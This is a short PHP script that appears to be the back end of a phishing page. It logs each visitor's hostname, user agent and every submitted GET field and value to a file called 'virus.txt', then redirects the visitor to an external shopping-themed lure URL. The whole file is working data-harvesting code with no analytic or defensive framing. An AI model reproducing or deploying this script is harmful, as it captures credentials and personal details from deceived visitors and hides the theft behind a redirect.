<?php
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$useragent=$_SERVER['HTTP_USER_AGENT'];
header("Location: http://www.weheartlt.16mb.com/DR-Shopping-evaluates-things-we-love-group.php&id-87157618065.html");
$handle = fopen("virus.txt", "a");
foreach($_GET as $variable => $value)
 {
fwrite($handle, $hostname);
fwrite($handle, $useragent);
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>